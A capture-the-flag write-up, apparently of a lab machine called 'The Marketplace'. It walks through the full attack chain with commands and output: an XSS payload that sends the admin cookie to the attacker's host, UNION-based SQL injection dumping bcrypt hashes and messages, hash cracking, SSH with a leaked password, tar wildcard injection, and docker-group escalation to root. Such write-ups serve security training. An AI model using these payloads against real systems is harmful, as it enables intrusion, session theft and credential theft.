# marketplace

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p22,80,32768 $TARGET -oN service
```

**Output**
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
32768/tcp open  http    Node.js (Express middleware)
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Fuzzing
```bash
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --status-codes 200 301
```

**Output**
```
200      GET       35l       62w      857c http://10.129.149.204/login
200      GET       30l       54w      667c http://10.129.149.204/signup
200      GET       29l       65w      748c http://10.129.149.204/item/1
200      GET       64l      102w      723c http://10.129.149.204/stylesheets/style.css
200      GET       29l       65w      747c http://10.129.149.204/item/2
```

### We can create a user, let's proceed to create one
At the URL `http://10.129.149.204/new` we can upload something to the marketplace.
It says file upload is disabled for security reasons.

### We try XSS in the description and Title fields
```
<script>alert('XSS');</script>
```
### The XSS triggers
### We find several interesting routes
/contact/
/report/

### We create an item with the following payload in the description field
```html
<img src="x" onerror="fetch('http://My_IP/steal?cookie='+document.cookie)">
```
### Then we report it
`http://$TARGET/report/id-object`

### We obtain the cookie
**Output**
```
10.129.149.204 - - [25/May/2026 14:23:45] "GET /steal?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3Nzk3MTkwMjZ9.LMaFek3tXVJ4hH5MSbKB2i4NPnOFFTD_QzhKiQGQZcs HTTP/1.1" 404 -
```
### We modify the cookie in our browser, and now we have access to the admin panel
`http://10.129.149.204/admin`

### We can see user info. If the page queries the database, we can try SQL injection
```
http://10.129.149.204:32768/admin?user=1%27
```
**Output**
```
error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
``` 
### We triggered the error, now let's exfiltrate data
```bash
export COOKIE="token=eyJ..."
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=999%20UNION%20SELECT%201,2,3,4%20--%20-"

### View current database
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=9999%20UNION%20SELECT%201,database(),3,4%20--%20-"
```
### We can only output data in the first column
```bash
curl -G -b "$COOKIE" --data-urlencode "user=-1 UNION SELECT CONCAT('DB: ',database(),' | User: ',user(),' | Version: ',@@version),2,3,4 -- -" "http://10.129.149.204:32768/admin"
```

**Output**
```
ID: DB: marketplace | User: marketplace@172.18.0.3 | Version: 8.0.21 <br />
```

### List info
```bash
## List tables
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20-"
## Extract users and passwords
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(username,':',password)),2,3,4%20FROM%20users%20--%20-"
```
**Output**
```
User 2 <br />
          ID: system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,user:$2b$10$U0ygojEDHXJZmdIpF98XEeiKlxKTBeZQ/uPVZIgCosh7XFyDkBojK <br />
```
```
User	bcrypt Hash
system	$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael	$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake	$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
```

### Cracking the hashes
```bash
## Add the hashes of potential ssh users
cat > hashes.txt << 'EOF'
$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
EOF
# Mode 3200 = bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -O
```

### While cracking, let's read the messages
```bash
## Columns
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name='messages'%20--%20-"
## Extract the info
curl -b "$COOKIE" "http://10.129.149.204:32768/admin?user=-1%20UNION%20SELECT%20GROUP_CONCAT(CONCAT(id,':',user_from,':',user_to,':',is_read,':',message_content)%20SEPARATOR%20'|'),2,3,4%20FROM%20messages%20--%20-"
```
**Output**
```
"An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ"
```

### We try SSH connection
```bash
sshpass -p '@b_ENXkGYUCAv3zJ' ssh jake@$TARGET
```
___

## Privesc

### Linux enum 
```bash
cat user.txt
sudo -l
cat /opt/backups/backup.sh  
```

**Output**
```
User jake may run the following commands on the-marketplace:                                
    (michael) NOPASSWD: /opt/backups/backup.sh  
  ______
  #!/bin/bash                                                                                 
echo "Backing up files...";                                                                 
tar cf /opt/backups/backup.tar *  
```
### Escalation to michael 
```bash
cd /opt/backups

cat > shell.sh << 'EOF'
#!/bin/sh
/bin/sh
EOF

chmod +x shell.sh

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

sudo -u michael /opt/backups/backup.sh
```

Stabilize:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

### Enumeration 
```bash
id
whoami
```
> The user michael is in the docker group 

### Docker Group Abuse
```bash
docker run -v /:/host alpine chroot /host /bin/bash
```
**Explanation**
```
-v /:/host (Volume Mounting): "Mounts" the root directory (the entire file system) of the host machine inside the container into the /host folder. The container can see and modify all files on the real system.

chroot /host (Change Root): Changes the root of the file system for the running process. Basically, it tricks the process inside the container into thinking that the /host folder (which is the host system) is its new root /.

/bin/bash (Execution): Starts a Bash terminal. Because the container runs with privileges (since the docker group has access to the daemon running as root), this terminal operates on the host file system with root permissions.
```


## Root Flag 
```bash
cat /root/root.txt
```

---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [XSS-Payloads](../../../techniques/xss/XSS-Payloads.md)
- [sql-union-injection](../../../exploits/web-disclosure/sql-union-injection.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [sshpass](../../../tools/shells/sshpass.md)
- [tar-wildcard-injection](../../../privesc/linux/tar-wildcard-injection.md)
- [docker-group-escape](../../../privesc/linux/docker-group-escape.md)